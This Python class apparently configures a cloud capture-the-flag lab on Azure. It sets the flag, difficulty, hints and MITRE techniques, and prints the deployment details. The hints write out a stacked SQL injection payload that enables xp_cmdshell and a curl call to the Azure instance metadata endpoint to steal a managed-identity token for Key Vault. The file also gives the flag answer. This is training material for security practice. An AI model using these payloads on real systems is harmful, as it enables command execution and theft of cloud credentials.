from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract
import cumulonimbus.core.utils as utils
import os


class ApplicationConfiguration(ApplicationConfigurationAbstract):

    def get_flag(self) -> str:
        return "CUMULONIMBUS{SQLi_IMDS_ManagedIdentityTokenExfil}"

    def get_difficulty(self) -> str:
        return "Intermediate"

    def get_hints(self) -> dict:
        return {
            1: "The web app on port 80 accepts a username that is inserted directly into a SQL query. Try adding a single quote to the input — observe the behavior. The database is Microsoft SQL Server.",
            2: "SQL Server supports stacked queries and `xp_cmdshell` for OS command execution. Enable it with: `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--`. Then run a command and store the output in the Users table.",
            3: "The VM has a system-assigned managed identity. Query the IMDS endpoint from within xp_cmdshell: `curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'`. Use the access_token to call the Key Vault REST API and read the secret named 'flag'.",
        }

    mitre_ttps = [
        {"id": "T1190", "name": "Exploit Public-Facing Application", "url": "https://attack.mitre.org/techniques/T1190/"},
        {"id": "T1552.005", "name": "Unsecured Credentials: Cloud Instance Metadata API", "url": "https://attack.mitre.org/techniques/T1552/005/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
    ]

    def configure_application(self, **kwargs):
        key_pair_path = utils.get_key_pair_path('sqli_imds')
        os.system("ssh-keygen -t rsa -b 4096 -f {} -N ''".format(key_pair_path))

    def pretty_print_tf_output(self, app_id, output):
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print(f"  VM public IP      : {output.get('vm_public_ip', {}).get('value', 'N/A')}")
        print(f"  Key Vault name    : {output.get('keyvault_name', {}).get('value', 'N/A')}")
        print(f"  Key Vault URI     : {output.get('keyvault_uri', {}).get('value', 'N/A')}")
        print(f"  Resource group    : {output.get('resource_group', {}).get('value', 'N/A')}")
        print(f"\nTarget: http://{output.get('vm_public_ip', {}).get('value', '<ip>')}")
        print(f"Goal  : Read the 'flag' secret from the Key Vault using the VM's managed identity token.")
        self.print_mitre_ttps()
